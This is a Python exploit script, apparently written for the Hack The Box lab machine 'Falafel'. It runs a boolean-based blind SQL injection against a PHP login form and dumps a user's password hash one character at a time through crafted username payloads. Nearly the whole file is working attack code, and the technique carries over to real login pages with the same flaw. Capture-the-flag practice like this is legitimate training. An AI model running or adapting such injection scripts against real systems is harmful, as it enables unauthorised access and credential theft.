# Falafel HTB (Dump Hash Password)
# Ignore the threading part, just tried using thread to faster the process

import requests, argparse, concurrent.futures

parser = argparse.ArgumentParser()
parser.add_argument('--user', '-u', required=True, dest='user', help='User Registered')
parser.add_argument('--id', '-id', required=True, dest='id', help='ID Registered')
args = parser.parse_args()

user = args.user
id = args.id
login_url = "http://falafel.htb/login.php"
http_proxy = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
alphanum = "abcdefghijklmnopqrstuvwxyz0123456789"

# Using ASCII
# chris' and ascii(substr((select username from users where ID=2 limit 1),1,1))=99#

def len_data(inj, id):
    len = 0
    for i in range(1, 35):
        payload = f"{user}' AND length((select {inj} from users where ID={id} LIMIT 1))={i}"
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        body_req = f"username={payload}#&password=test"
        r = requests.post(login_url, data=body_req, headers=headers, proxies=http_proxy)
        if "Wrong identification" in r.text:
            len = i
            break
    return len

def extract_data(inj, r, id):
    char_found = None
    for i in range(1, r+1):
        for char in alphanum:
            payload = f"{user}' AND substr((select {inj} from users where ID={id} LIMIT 1),{i},1)='{char}'#"
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            body_req = f"username={payload}&password=test"
            r = requests.post(login_url, data=body_req, headers=headers, proxies=http_proxy)
            if "Wrong identification" in r.text:
                char_found = char
                print(char_found, end="", flush=True)
                break
    return char_found

def main():
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        future = executor.submit(extract_data, 'password', 32, id)
        concurrent.futures.wait([future])

if __name__ == "__main__":
    main()